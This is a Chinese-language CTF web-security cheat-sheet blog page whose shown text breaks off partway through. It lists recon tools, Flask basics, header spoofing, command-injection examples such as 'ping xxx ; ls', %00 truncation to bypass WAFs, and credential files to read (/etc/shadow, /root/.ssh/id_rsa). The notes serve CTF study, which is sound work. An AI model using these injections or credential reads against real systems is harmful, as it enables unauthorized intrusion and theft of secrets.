<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>WEB - J-shiro's Blog</title><meta name=Description content="Hugo theme - LoveIt"><meta property="og:url" content="https://j-shiro.github.io/web_note/">
<meta property="og:site_name" content="J-shiro's Blog"><meta property="og:title" content="WEB"><meta property="og:description" content='寻找文件：/tmp，env，/etc/passwd
找文件名：find / -name "*flag*.txt"
工具 HackBar devtools X-Forwarded-For: 127.0.0.1 // 只允许本机登录 // 识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址 User Agent: // 向服务器发出请求的客户端软件 Referer: // 链接到当前请求页面的前一个网页的URL Cookie: xx=xx // 有时根据提示输入 Post data'><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-09T00:00:00+00:00"><meta property="article:modified_time" content="2025-05-28T20:31:43+08:00"><meta property="article:tag" content="Web"><meta property="og:image" content="https://j-shiro.github.io/logo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://j-shiro.github.io/logo.png"><meta name=twitter:title content="WEB"><meta name=twitter:description content='寻找文件：/tmp，env，/etc/passwd
找文件名：find / -name "*flag*.txt"
工具 HackBar devtools X-Forwarded-For: 127.0.0.1 // 只允许本机登录 // 识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址 User Agent: // 向服务器发出请求的客户端软件 Referer: // 链接到当前请求页面的前一个网页的URL Cookie: xx=xx // 有时根据提示输入 Post data'><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=referrer content="no-referrer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://j-shiro.github.io/web_note/><link rel=prev href=https://j-shiro.github.io/search/><link rel=next href=https://j-shiro.github.io/reverse_note/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"WEB","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/j-shiro.github.io\/web_note\/"},"image":["https:\/\/j-shiro.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"web","wordcount":9522,"url":"https:\/\/j-shiro.github.io\/web_note\/","datePublished":"2024-10-09T00:00:00+00:00","dateModified":"2025-05-28T20:31:43+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":{"@type":"ImageObject","url":"https:\/\/j-shiro.github.io\/images\/avatar.png","width":800,"height":800}},"author":{"@type":"Person","name":"jshiro"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="J-shiro's Blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/logo.png data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x" data-sizes=auto alt=/logo.png title=/logo.png><span id=id-1 class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>所有文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/about/>关于 </a><a class=menu-item href=https://github.com/J-shiro title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i>
</span></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="menu-item language" title=选择语言><i class="fa fa-globe fa-fw" aria-hidden=true></i>
<select class=language-select id=language-select-desktop onchange="location=this.value"><option value=/web_note/ selected>简体中文</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="J-shiro's Blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/logo.png data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x" data-sizes=auto alt=/logo.png title=/logo.png><span id=id-2 class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>所有文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/about/ title>关于</a><a class=menu-item href=https://github.com/J-shiro title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class=menu-item title=选择语言><i class="fa fa-globe fa-fw" aria-hidden=true></i>
<select class=language-select onchange="location=this.value"><option value=/web_note/ selected>简体中文</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">WEB</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>jshiro</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/notes/><i class="far fa-folder fa-fw" aria-hidden=true></i>Notes</a>&nbsp;<a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2024-10-09>2024-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 9522 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 20 分钟&nbsp;<span id=/web_note/ class=leancloud_visitors data-flag-title=WEB>
<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#工具>工具</a><ul><li><a href=#hackbar>HackBar</a></li><li><a href=#burpsuite>Burpsuite</a></li><li><a href=#dig>dig</a></li><li><a href=#扫描工具>扫描工具</a></li><li><a href=#githack>GitHack</a></li></ul></li><li><a href=#linux>Linux</a></li><li><a href=#python>Python</a><ul><li><a href=#基础知识>基础知识</a></li><li><a href=#debug命令执行>Debug命令执行</a></li><li><a href=#ssti模板注入>SSTI模板注入</a><ul><li><a href=#jinja2>Jinja2</a></li><li><a href=#绕过>绕过</a></li></ul></li><li><a href=#反序列化漏洞>反序列化漏洞</a></li><li><a href=#文件包含漏洞>文件包含漏洞</a></li><li><a href=#爬虫>爬虫</a></li><li><a href=#路径遍历漏洞>路径遍历漏洞</a></li></ul></li><li><a href=#php>PHP</a><ul><li><a href=#基础知识-1>基础知识</a></li><li><a href=#php伪协议>PHP伪协议</a></li><li><a href=#命令执行>命令执行</a></li><li><a href=#远程命令执行>远程命令执行</a></li><li><a href=#常见绕过>常见绕过</a></li><li><a href=#反序列化漏洞-1>反序列化漏洞</a></li><li><a href=#ssrf漏洞>SSRF漏洞</a></li><li><a href=#文件上传漏洞>文件上传漏洞</a></li><li><a href=#sql注入漏洞>SQL注入漏洞</a><ul><li><a href=#漏洞点>漏洞点</a></li><li><a href=#联合注入>联合注入</a></li><li><a href=#堆叠注入>堆叠注入</a></li><li><a href=#二次注入>二次注入</a></li><li><a href=#报错注入>报错注入</a></li><li><a href=#绕过-1>绕过</a></li></ul></li><li><a href=#ssi注入漏洞>SSI注入漏洞</a></li></ul></li><li><a href=#java>JAVA</a><ul><li><a href=#shiro漏洞>Shiro漏洞</a><ul><li><a href=#身份验证绕过>身份验证绕过</a></li></ul></li><li><a href=#文件泄露>文件泄露</a></li><li><a href=#sql注入>SQL注入</a></li><li><a href=#反序列化漏洞-2>反序列化漏洞</a></li></ul></li><li><a href=#js>JS</a><ul><li><a href=#文件上传>文件上传</a></li><li><a href=#xxe注入漏洞>XXE注入漏洞</a></li></ul></li><li><a href=#nodejs>Node.js</a><ul><li><a href=#基础知识-2>基础知识</a></li><li><a href=#ssrf漏洞-1>SSRF漏洞</a><ul><li><a href=#漏洞点-1>漏洞点</a></li><li><a href=#绕过-2>绕过</a></li></ul></li></ul></li></ul></nav></div></div><div class=content id=content><p>寻找文件：<code>/tmp</code>，<code>env</code>，<code>/etc/passwd</code></p><p>找文件名：<code>find / -name "*flag*.txt"</code></p><h2 id=工具>工具</h2><h3 id=hackbar>HackBar</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>devtools</span>
</span></span><span class=line><span class=cl><span class=n>X</span><span class=o>-</span><span class=n>Forwarded</span><span class=o>-</span><span class=nl>For</span><span class=p>:</span> <span class=mf>127.0.0.1</span> <span class=c1>// 只允许本机登录
</span></span></span><span class=line><span class=cl><span class=c1>// 识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>User</span> <span class=nl>Agent</span><span class=p>:</span> <span class=c1>// 向服务器发出请求的客户端软件
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>Referer</span><span class=p>:</span> <span class=c1>// 链接到当前请求页面的前一个网页的URL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>Cookie</span><span class=p>:</span> <span class=n>xx</span><span class=o>=</span><span class=n>xx</span> <span class=c1>// 有时根据提示输入
</span></span></span></code></pre></div></div><p><strong>Post data</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>xx</span><span class=o>=</span>xx<span class=p>&amp;</span><span class=nv>xx</span><span class=o>=</span>xx</span></span></code></pre></div></div><h3 id=burpsuite>Burpsuite</h3><p>Intruder模块：可以多线程对URL或data中的参数进行<strong>爆破</strong></p><p>数据包结尾空2行</p><h3 id=dig>dig</h3><p>用于从域名系统（DNS）服务器中收集信息，在线网站：<code>https://tool.lu/dns/index.html</code></p><h3 id=扫描工具>扫描工具</h3><ul><li>扫描web目录，扫描目标：git泄露、源代码泄露</li></ul><p><strong>dirsearch</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 dirsearch.py -u http://xx.com:xx -x 403,301,302,429 -t <span class=m>10</span> <span class=c1># 忽略403,301,302,429</span>
</span></span><span class=line><span class=cl>-e php <span class=c1># 选择扫描</span></span></span></code></pre></div></div><p><strong>dirmap</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 dirmap.py -i http://target -lcf <span class=c1># 单目标</span></span></span></code></pre></div></div><h3 id=githack>GitHack</h3><ul><li><code>.git</code>泄露利用，重建还原源代码</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 GitHack.py http://xxx/.git/ <span class=c1># 会在目录下得到源代码</span></span></span></code></pre></div></div><h2 id=linux>Linux</h2><p><strong>远程命令绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping x:x:x:x <span class=p>;</span> ls
</span></span><span class=line><span class=cl>ping xxx <span class=p>|</span> ls</span></span></code></pre></div></div><p><strong>敏感文件</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>shadow</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>hosts</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=n>net</span><span class=o>/</span><span class=n>arp</span> <span class=c1>//arp表，可以获得内网其他机器的地址
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=p>.</span><span class=n>ssh</span><span class=o>/</span><span class=n>id_rsa</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=p>.</span><span class=n>ssh</span><span class=o>/</span><span class=n>id_rsa</span><span class=p>.</span><span class=n>pub</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=p>.</span><span class=n>ssh</span><span class=o>/</span><span class=n>authorized_keys</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>ssh</span><span class=o>/</span><span class=n>sshd_config</span></span></span></code></pre></div></div><p><strong>%00截断</strong></p><p>操作系统层漏洞，OS由C语言编写，以<code>\0</code>作为字符串结尾，修改数据包插入<code>\0</code>达成截断，可绕过软 WAF 白名单限制</p><h2 id=python>Python</h2><h3 id=基础知识>基础知识</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>for</span> <span class=n>index</span><span class=p>,</span> <span class=n>num</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>num_list</span><span class=p>):</span> <span class=c1># num_list = [xx, xx]</span>
</span></span><span class=line><span class=cl>    <span class=n>xxx</span> <span class=c1># 可以获取索引和内容</span>
</span></span><span class=line><span class=cl><span class=n>secure_filename</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span> <span class=c1># 清理文件名，去除潜在恶意字符</span>
</span></span><span class=line><span class=cl><span class=n>files</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 重置文件指针到开头</span>
</span></span><span class=line><span class=cl><span class=n>timestamp</span> <span class=o>=</span> <span class=n>datetime</span><span class=o>.</span><span class=n>datetime</span><span class=o>.</span><span class=n>now</span><span class=p>()</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s1>&#39;%Y%m</span><span class=si>%d</span><span class=s1>%H%M%S&#39;</span><span class=p>)</span> <span class=c1># 格式化输出时间</span>
</span></span><span class=line><span class=cl><span class=n>uuid</span><span class=o>.</span><span class=n>uuid4</span><span class=p>()</span> <span class=c1># 通用唯一标识符（Universally Unique Identifier）</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>environ</span> <span class=c1># 查看系统环境变量</span></span></span></code></pre></div></div><p><strong>排列组合</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>permutations</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=s2>&#34;b&#34;</span><span class=p>,</span> <span class=s2>&#34;c&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>item</span> <span class=o>=</span> <span class=n>permutations</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>图片处理</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>mimetypes</span><span class=o>.</span><span class=n>guess_type</span><span class=p>(</span><span class=n>file_path</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=c1># 根据文件路径扩展名推断MIME类型</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span> <span class=k>as</span> <span class=n>img</span><span class=p>:</span> <span class=c1># 图片打开 返回img对象</span>
</span></span><span class=line><span class=cl>    <span class=n>mime</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>get_format_mimetype</span><span class=p>()</span> <span class=c1># 获取MIME类型</span></span></span></code></pre></div></div><p><strong>类</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=fm>__repr__</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span> <span class=c1># 重写自我描述信息, print时打印内容</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;xxx&#34;</span></span></span></code></pre></div></div><p><strong>Flask</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>,</span> <span class=n>template_folder</span><span class=o>=</span><span class=s1>&#39;another&#39;</span><span class=p>)</span> <span class=c1># 初始化flask应用 </span>
</span></span><span class=line><span class=cl><span class=c1># 默认html模版文件在templates文件夹中, 此处指定为another</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;some&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>xxx</span> <span class=c1># 配置</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span> <span class=c1># 启动应用</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/hello&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span> <span class=c1># 设置路由及函数</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>xx</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>:</span> <span class=c1># files是字典</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;错误信息&#39;</span><span class=p>,</span> <span class=mi>400</span> <span class=c1># 状态码</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>))</span> <span class=c1># 重定向到主页</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>,</span> <span class=nb>id</span> <span class=o>=</span> <span class=s2>&#34;xx&#34;</span><span class=p>)</span> <span class=c1># 返回模版及id参数</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=c1># &#34;POST&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span> <span class=c1># 字典找键, 未找到返回None</span></span></span></code></pre></div></div><p><strong>Jinja2-模板引擎</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 自定义模板加载</span>
</span></span><span class=line><span class=cl><span class=n>env</span> <span class=o>=</span> <span class=n>Environment</span><span class=p>(</span><span class=n>loader</span><span class=o>=</span><span class=n>FileSystemLoader</span><span class=p>(</span><span class=s1>&#39;static&#39;</span><span class=p>),</span> <span class=n>autoescape</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 加载方式: FileSystemLoader 从 static 文件夹中加载模板文件&#34;.html&#34;等</span>
</span></span><span class=line><span class=cl><span class=c1># autoescape=True 安全机制:  XML/HTML 自动转义特殊字符防止XSS攻击</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 重定义 渲染函数</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>render_template</span><span class=p>(</span><span class=n>template_name</span><span class=p>,</span> <span class=o>**</span><span class=n>context</span><span class=p>):</span> <span class=c1># context是关键字参数, 如name=&#34;Alice&#34;, age=30</span>
</span></span><span class=line><span class=cl>    <span class=n>template</span> <span class=o>=</span> <span class=n>env</span><span class=o>.</span><span class=n>get_template</span><span class=p>(</span><span class=n>template_name</span><span class=p>)</span> <span class=c1># 加载模板</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>template</span><span class=o>.</span><span class=n>render</span><span class=p>(</span><span class=o>**</span><span class=n>context</span><span class=p>)</span> <span class=c1>#  context 字典渲染模板</span></span></span></code></pre></div></div><h3 id=debug命令执行>Debug命令执行</h3><ul><li>Flask框架，已知<code>PIN</code>码的情况下，访问<code>http://xxx.xxx/console</code>进入控制台输入<code>PIN</code>码进行RCE</li><li>debug模式开启，报错会泄露源码及后台路径</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>)</span> <span class=c1># 切换目录</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>file</span><span class=p>)</span> <span class=c1># 删除文件</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>rmdir</span><span class=p>(</span><span class=n>directory</span><span class=p>)</span> <span class=c1># 删除目录</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=s1>&#39;xx&#39;</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=c1># 创建目录 目标已存在不会抛出异常</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>)</span> <span class=c1># 判断目录是否存在</span>
